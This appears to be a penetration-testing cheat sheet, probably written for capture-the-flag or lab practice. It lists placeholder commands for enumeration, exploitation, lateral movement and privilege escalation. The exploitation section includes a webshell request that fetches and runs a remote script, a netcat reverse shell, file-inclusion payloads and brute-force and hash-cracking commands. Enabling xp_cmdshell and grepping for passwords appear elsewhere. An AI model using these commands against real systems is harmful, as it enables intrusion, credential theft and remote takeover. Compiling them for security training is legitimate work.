# Penetration Testing

Overview
---------
1. - [Enumeration](#1---enumeration)
2. - [Exploitation](#2---exploitation)
3. - [Lateral Movement](#3---lateral-movement)
4. - [Privilege Escalation](#4---privilege-escalation)
5. - [Miscellaneous](#5---Miscellaneous)
6. - [Online Resources](#6---online-resources)
7. - [Browser Plugins](#7---browser-plugins)
     
#1. - Enumeration
-----------------------------------------

- Nmap

```
$ nmap -sC -sV -p- -Pn -A <IP address>
$ nmap -sC -sV -p- -Pn -A -sU <IP address>
$ nmap --top-ports=100 <IP address>
$ nmap <IP address> --script vuln
```

- FTP

```
$ ftp <IP address> (anonymous:anonymous)
ftp> dir
ftp> get <file>
ftp> put <file>
```

- Telnet

```
$ telnet <IP address>
```

- Smbclient

```
$ smbclient -L <IP address>
$ smbclient -L <IP address> -U <username>
$ smbclient \\\\<IP address>\\c$
$ smbclient \\\\<IP address>\\c$ -U <username>
```

- Redis-cli

```
$ redis-cli -h <IP address>
<IP address>:6379> select <db number e.g. 0>
<IP address>:6379> keys *
<IP address>:6379> get <key>
```

- Xfreerdp

```
$ xfreerdp /v:<IP address>
$ xfreerdp /v:<IP address> /u:Administrator
$ freerdp /v:<IP address> /cert:ignore /u:Administrator
```

- Gobuster

```
$ gobuster dir -w <wordlist> -u <URL>
$ gobuster dir -w <wordlist> -u <URL> -x php,html
$ gobuster vhost -w <wordlist> -u <URL>
```

- MongoDB

```
$ ./mongo mongodb://<IP address>:27017
> show dbs;
> use <db name>;
> show collections;
> db.<collection>.find().pretty();
```

- Rsync

```
$ rsync --list-only <IP address>::
$ rsync --list-only <IP address>::<share>
$ rsync <IP address>::<share>/<filename> <filename>
```

- MySQL

```
$ mysql -h <IP address> -u root
MariaDB [(none)]> SHOW databases;
MariaDB [(none)]> USE <database name>;
MariaDB [(none)]> SHOW tables;
MariaDB [(none)]> SELECT * FROM <table name>;
```

- MSSQL

```
$ python3 mssqlclient.py <domain>/<username>@<IP address> -windows-auth
SQL> SELECT is_srvrolemember('sysadmin');
SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE; sp_configure; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell "whoami";
```

- AWS

```
$ aws --endpoint=<URL> s3 ls
$ aws --endpoint=<URL> s3 ls s3://<S3 bucket name>
$ aws --endpoint=<URL> s3 cp <filename> s3://<S3 bucket name>
```

- Curl

```
$ curl -v <URL>
```

- Wget

```
$ wget http://<IP address>/<file> -outfile <file>"
```

- Server Side Template Injection (SSTI)

```
${7*7}
```

- PostgreSQL

```
$ psql -h <IP address> -U <username> -p <password>
<username>=# \l
<username>=# \c secrets
<username>=# \dt
<username>=# SELECT * FROM <table>;
```

- Jenkins

```
http://<domain name>/script
```

#2. - Exploitation
-----------------------------------------

- Local File Inclusion (LFI)

```
http://<domain name>/<page>?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

- Remote File Inclusion (RFI)

```
sudo responder -I <network interface>
http://<domain name>/<page>?page=//<IP address>/somefile
```

- Webshell

```
http://<domain name>/shell.php?cmd=id
http://<domain name>/shell.php?cmd=curl%20<IP address>:8000/shell.sh|bash
```

- John The Ripper

```
$ john -w=/usr/share/wordlists/rockyou.txt hash.txt
$ john --show hashes.txt
```

- HashID

```
$ hashid <hash>
```

- Netcat

```
$ nc -nlvp <port>
$ nc -nv <IP address> <port> -e cmd.exe
```

- Host Files

```
$ python3 -m http.server 8000
```

- Hydra

```
$ hydra -L <usernames.txt> -p '<password>' <IP address> ssh
```

- Escape Restricted Shell

```
$ python3 -c 'import pty;pty.spawn("/bin/bash")'; CTRL+Z; stty raw -echo; fg; export TERM=XTERM
```

- Zip2john

```
$ zip2john <ZIP file> > hashes.txt
```

- Hashcat

```
$ hashcat -a 0 -m 0 hashes.txt <wordlist>
```

#3. - Lateral Movement
-----------------------------------------

- Evil-winrm

```
$ evil-winrm -i <IP address> -u <username> -p <password>
```

- Local Port Forwarding

```
$ ssh -L 1234:localhost:5432 <username>@<remote IP address>
```

- Dynamic Port Forwarding

```
$ ssh -D 1234 <username>@<remote IP address>
```

- Proxychains

```
Edit /etc/proxychains4.conf
$ proxychains <command>
```

- PsExec

```
$ python psexec.py <username>:<password>@<IP address>
$ python psexec.py <username>@<IP address>
```

#4. - Privilege Escalation
-----------------------------------------

- WinPEAS

```
C:\> .\winPEASx64.exe
```

- LinPEAS

```
$ .\linpeas.sh
```

- Find passwords

```
$ cat * | grep -i passw*
```

- Sudo

```
$ sudo -l
```

- Add /tmp directory to the PATH environmental variable 

```
$ export PATH=/tmp:$PATH
```

#5. - Miscellaneous
-----------------------------------------

- Connect to OpenVPN

```
$ sudo openvpn <filename>.ovpn
```

- Clone a GitHub repository

```
$ git clone <URL.git>
```

- Enable a browser to resolve a hostname to a IP address

```
Edit /etc/hosts
```

- Check for local listening ports

```
$ ss -tulpn
```

- Configure your browser to send traffic through a proxy

```
Preferences -> Network Settings -> Manual Proxy Configuration
```

- Find a file

```
$ find / -name <string> 2>/dev/null
```

#6. - Online Resources
-----------------------------------------

- Speedguide

```
https://www.speedguide.net/port.php?port=3389
```

- CrackStation

```
https://crackstation.net/
```

#7. - Browser Plugins
-----------------------------------------

- Wappalyzer: Website technology analyser

```
https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/
```

- Cookie Editor: edit cookies

```
https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/
```
